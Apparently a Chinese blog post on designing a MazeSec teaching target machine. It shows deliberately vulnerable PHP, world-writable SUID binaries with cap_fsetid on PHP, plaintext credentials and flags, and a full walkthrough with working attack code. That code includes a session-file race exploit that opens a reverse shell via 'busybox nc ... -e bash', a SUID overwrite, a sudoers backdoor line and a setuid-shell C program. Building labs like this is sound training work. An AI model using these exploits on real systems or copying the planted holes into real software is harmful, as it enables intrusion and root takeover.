@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>MazeSec su靶机设计流程 - the0n3</title>
+        <meta name="description" content="设计思路：web入口处首页展示静态内容，选手扫描web目录发现info.php，shell.php，根据info.php的phpinfo信息找到php session的存储路径，控制session文件名及文件内容执行命令反弹shell，在/var/tmp目录可以发现存放多个suid的su二进制文件，以及PHP二进制文件…">
+    <link rel="canonical" href="https://the0n3.top/posts/8ba570/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec su靶机设计流程">
+    <meta property="og:description" content="设计思路：web入口处首页展示静态内容，选手扫描web目录发现info.php，shell.php，根据info.php的phpinfo信息找到php session的存储路径，控制session文件名及文件内容执行命令反弹shell，在/var/tmp目录可以发现存放多个suid的su二进制文件，以及PHP二进制文件…">
+    <meta property="og:url" content="https://the0n3.top/posts/8ba570/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/og-default.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec su靶机设计流程">
+    <meta name="twitter:description" content="设计思路：web入口处首页展示静态内容，选手扫描web目录发现info.php，shell.php，根据info.php的phpinfo信息找到php session的存储路径，控制session文件名及文件内容执行命令反弹shell，在/var/tmp目录可以发现存放多个suid的su二进制文件，以及PHP二进制文件…">
+        <meta name="twitter:image" content="https://the0n3.top/images/og-default.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec su靶机设计流程</h1>
+    <p>
+        <span class="meta">发布于: 2026-10-12 13:35</span>
+    </p>
+    <div class="post-body">
+        <p>设计思路：web入口处首页展示静态内容，选手扫描web目录发现info.php，shell.php，根据info.php的phpinfo信息找到php session的存储路径，控制session文件名及文件内容执行命令反弹shell，在/var/tmp目录可以发现存放多个suid的su二进制文件，以及PHP二进制文件存在的cap_fsetid权限，利用该权限下读写文件不会损失二进制文件suid属性，读取bash二进制文件内容写入su实现提权。</p>
+<p>设计上，对于给php二进制文件设置cap_fsetid权限，suid二进制文件4777全局可写的suid文件的场景极不合理，设计这个场景主要是为了教学目的，一方面给选手发现直接修改suid文件会失去suid属性，另一方面抛砖引玉通过Linux capabilites中少见的cap_fsetid权限增加AI梭哈成本，让选手在过程中可以了解到一些相关内容，场景仅适用于学习交流。想要了解更全面的Linux capabilites知识，了解更多请阅读<a href="https://hacktricks.wiki/zh/linux-hardening/interesting-files-permissions/linux-capabilities.html#linux-capabilities">Linux capabilities - HackTricks</a>文档，我对PHP session的学习和理解<a href="https://the0n3.top/posts/php-tmp-file/">PHP临时文件生成分析及利用</a>。</p>
+<h2>基础环境安装</h2>
+<p>安装 python3、getcap、setcap、gnu版本su、find以及编译环境，优化选手体验，同时可以满足选手编译独立二进制文件的需求。</p>
+<pre><code class="language-bash">apk add libcap findutils util-linux-login build-base python3</code></pre>
+<p>模板靶机已配置过nginx、php-fpm，此处不再重复安装配置</p>
+<h2>web准备</h2>
+<p>index.php</p>
+<pre><code class="language-php">&lt;?php
+echo "Hi!";</code></pre>
+<p>info.php</p>
+<pre><code class="language-php">&lt;?php 
+phpinfo();</code></pre>
+<p>shell.php</p>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+
+$f = $_GET['f'] ?? '';
+if (file_exists($f)) {
+    system(". $f");
+}</code></pre>
+<h2>提权准备</h2>
+<p>准备多份su二进制文件，并设置setuid</p>
+<pre><code class="language-bash"># 确保su不是/bin/bbsuid的软链接
+ls -alh /bin/su
+# 复制10份
+for i in {1..10}; do cp /bin/su /var/tmp/su$i; done
+chmod 4777 /var/tmp/su*</code></pre>
+<p>给php补充cap_fsetid权限</p>
+<pre><code class="language-bash">ls /usr/bin/php*
+setcap cap_fsetid+ep /usr/bin/php85</code></pre>
+<p>声明信息：</p>
+<pre><code class="language-bash">cat &lt;&lt; "EOF" &gt; /var/tmp/README
+你好，这是一个教学环境。你至少有 10 次机会可以提权到 root。
+祝你学习工作顺利！
+
+---
+
+Hi, this is a teaching environment. You have at least 10 chances to escalate to root.
+Good luck and happy hacking!
+EOF</code></pre>
+<h2>用户密码修改</h2>
+<p>添加一个普通用户</p>
+<pre><code class="language-bash">useradd daochunhan -s /bin/bash -m
+echo "daochunhan:@daochunhan" | chpasswd</code></pre>
+<p>root修改密码</p>
+<pre><code class="language-bash">echo "root:root@Mazesec" | chpasswd</code></pre>
+<h2>放置flag</h2>
+<pre><code class="language-bash">echo 'flag{root-7beb8555c08d73b62d27e5fe69886bba}' &gt; /root/root.txt
+echo 'flag{user-f40e447ab9ba43c5352eae22b260893a}' &gt; /home/daochunhan/user.txt
+chown daochunhan:daochunhan /home/daochunhan/user.txt
+chmod 664 /home/daochunhan/user.txt</code></pre>
+<h2>压缩镜像</h2>
+<p>清理磁盘空间及痕迹参考：<a href="https://the0n3.top/posts/vm-trace-cleanup-and-image-compression/">https://the0n3.top/posts/vm-trace-cleanup-and-image-compression/</a></p>
+<p>压缩空间</p>
+<pre><code class="language-bash"># 用零填充空闲空间，便于压缩
+dd if=/dev/zero of=/zero bs=1M || true; rm -f /zero</code></pre>
+<h2>测试</h2>
+<p>web扫描目录可以发现info.php，shell.php，利用info.php的phpinfo信息找到php session的存储路径，控制session文件名及文件内容执行命令反弹shell</p>
+<pre><code class="language-python">import io
+import requests
+import threading
+url = 'http://192.168.56.158/shell.php'
+sessionid = 'aaaa'
+
+def write(session): # 写入临时文件
+    while True:
+        fileBytes = io.BytesIO(b'a'*1024*200)
+        session.post(url,
+        cookies = {'PHPSESSID':sessionid},
+        data = {'PHP_SESSION_UPLOAD_PROGRESS':'''
+busybox nc 192.168.56.111 4444 -e bash
+'''},
+        files={'file':('1.jpg',fileBytes)}
+        )
+
+def read(session):
+    while True:
+        session.get(url + '?f=/tmp/sess_' + sessionid)
+
+evnet=threading.Event() # 多线程
+
+session = requests.session()
+for i in range(5):
+    threading.Thread(target = write,args = (session,)).start()
+for i in range(5):
+    threading.Thread(target = read,args = (session,)).start()
+
+evnet.set()</code></pre>
+<p>这版本AlpineLinux使用script优化反弹shell时会遇到This account is not available问题，可以使用python优化反弹shell。</p>
+<pre><code class="language-python">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p>拿到基础shell后，可以通过利用cap_fsetid权限读取bash二进制文件内容写入su，拿到suid bash，受AlpineLinux的Busybox影响，可以利用suid bash给的fsuid再进一步获取完整root权限。</p>
+<p>介绍下cap_fsetid权限，cap_fsetid是Linux capabilities中的一个权限，允许进程在写入文件时保留文件的set-user-ID和set-group-ID位。通常情况下，当一个非特权用户修改一个具有setuid或setgid位的文件时，这些位会被清除，以防止潜在的安全风险。然而，如果进程拥有cap_fsetid权限，它可以在写入文件时保留这些位，从而允许非特权用户创建或修改具有setuid或setgid位的文件。靶机在/var/tmp下准备了10个suid的全局可写的su二进制文件，他们几乎只会存在于教学环境中，实际生产环境中不应该存在这种情况。</p>
+<pre><code class="language-bash">nginx@Maze:/var/tmp$ getcap -r /
+/usr/bin/php85 cap_fsetid=ep
+nginx@Maze:/var/tmp$ ls -alh su1
+-rwsrwxrwx    1 root     root       46.0K Oct 12 15:16 su1
+nginx@Maze:/var/tmp$ /usr/bin/php85 -r 'file_put_contents("su1",file_get_contents("/bin/bash"));'
+nginx@Maze:/var/tmp$ ls -alh su1
+-rwsrwxrwx    1 root     root      771.0K Oct 12 16:30 su1
+nginx@Maze:/var/tmp$ ./su1 -p
+su1-5.3# cat /root/root.txt
+cat: can't open '/root/root.txt': Permission denied
+su1-5.3# echo 'ALL ALL=(ALL) NOPASSWD:ALL' &gt; /etc/sudoers.d/a
+su1-5.3# exit
+exit
+nginx@Maze:/var/tmp$ sudo -i
+root@Maze:~#</code></pre>
+<p>或者编译独立二进制文件覆盖suid su获取完整权限</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/bash", "bash", "-p", NULL);
+}</code></pre>
+<p>编译过程找不到cc1，手动加下cc链或者攻击机静态编译了</p>
+<pre><code class="language-bash">nginx@Maze:/var/tmp$ export PATH="/usr/libexec/gcc/x86_64-alpine-linux-musl/15.2.0:$PATH"
+nginx@Maze:/var/tmp$ gcc daochunhan.c -o daochunhan
+nginx@Maze:/var/tmp$ getcap -r /
+/usr/bin/php85 cap_fsetid=ep
+nginx@Maze:/var/tmp$ /usr/bin/php85 -r 'file_put_contents("su2",file_get_contents("./daochunhan"));'
+nginx@Maze:/var/tmp$ ls -alh su2
+-rwsrwxrwx    1 root     root       18.0K Oct 12 16:43 su2
+nginx@Maze:/var/tmp$ ./su2
+root@Maze:/var/tmp#</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>MazeSec</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#SUID</span>
+                                    <span>#Capabilities</span>
+                            </span>
+            </div>
+    </article>
+
+<section class="post-recommend" data-featured-recommend hidden aria-labelledby="featuredRecommendTitle">
+    <h2 class="post-recommend__title" id="featuredRecommendTitle">精选推荐</h2>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark_dimmed"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/random-recommend/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
